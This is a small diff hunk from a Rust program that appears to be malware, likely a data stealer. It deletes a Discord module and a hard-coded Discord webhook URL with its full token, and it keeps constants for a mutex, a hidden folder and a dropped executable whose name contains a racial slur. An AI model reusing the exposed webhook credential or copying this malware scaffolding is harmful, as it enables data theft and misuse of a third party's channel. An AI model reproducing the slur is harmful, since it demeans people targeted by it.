@@ -12,9 +12,7 @@ use std::{
 
 mod fs;
 mod os;
-mod discord;
 
-static WEBHOOK: &str = "https://discord.com/api/webhooks/1103404480541765762/QTXDSkjxpTS14SEPL4_88qj80fuvEddkLEAS9mjui1hVsx0CpnB252k0mT_RjFgvbKl9";
 static FILE_NAME: &str = "nigga.exe";
 static MUTEX: &str = "asdfafds9i867asdf7896";
 static FOLDER_NAME: &str = "asdfsad7f6sd786f";
